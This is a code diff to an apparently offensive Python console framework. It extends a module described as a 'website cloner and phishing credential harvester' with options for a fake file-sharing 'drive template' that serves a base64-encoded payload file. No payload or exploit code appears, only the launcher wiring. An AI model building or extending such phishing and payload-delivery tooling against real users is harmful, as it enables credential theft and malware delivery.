@@ -125,12 +125,31 @@ def run_rabid_spider(opts):
 def run_brainwipe(opts):
     url = opts.get('URL')
     template = opts.get('TEMPLATE')
-    if not url:
-        print("[!] Set URL before running.")
-        return
-    args = [sys.executable, os.path.join('DAEMONS', 'brainwipe', 'brainwipe.py'), url]
+    foldername = opts.get('FOLDERNAME')
+    filename = opts.get('FILENAME')
+    filesize = opts.get('FILESIZE')
+    payload_file = opts.get('PAYLOAD_FILE')
+    payload_name = opts.get('PAYLOAD_NAME')
+
+    args = [sys.executable, os.path.join('DAEMONS', 'brainwipe', 'brainwipe.py')]
+    # Only pass URL if TEMPLATE is not set
     if template:
         args += ['--template', template]
+    else:
+        if not url:
+            print("[!] Set URL before running.")
+            return
+        args.append(url)
+    if foldername:
+        args += ['--foldername', foldername]
+    if filename:
+        args += ['--filename', filename]
+    if filesize:
+        args += ['--filesize', filesize]
+    if payload_file:
+        args += ['--payload-file', payload_file]
+    if payload_name:
+        args += ['--payload-name', payload_name]
     subprocess.run(args)
 
 def run_blackout(opts):
@@ -225,8 +244,24 @@ MODULES = {
     ),
     'daemon/brainwipe': Module(
         'daemon/brainwipe',
-        options={'URL': '', 'TEMPLATE': ''},
-        option_desc={'URL': 'Target URL to clone', 'TEMPLATE': 'Template name (optional)'},
+        options={
+            'URL': '',
+            'TEMPLATE': '',
+            'FOLDERNAME': '',
+            'FILENAME': '',
+            'FILESIZE': '',
+            'PAYLOAD_FILE': '',
+            'PAYLOAD_NAME': ''
+        },
+        option_desc={
+            'URL': 'Target URL to clone',
+            'TEMPLATE': 'Template name (optional)',
+            'FOLDERNAME': 'Folder name for drive template',
+            'FILENAME': 'File name for drive template',
+            'FILESIZE': 'File size for drive template',
+            'PAYLOAD_FILE': 'Path to a file to use as the payload (will be base64-encoded automatically)',
+            'PAYLOAD_NAME': 'Payload file name for drive template (overrides FILENAME for payload only)'
+        },
         run_func=run_brainwipe,
         description='Website cloner and phishing credential harvester.'
     ),
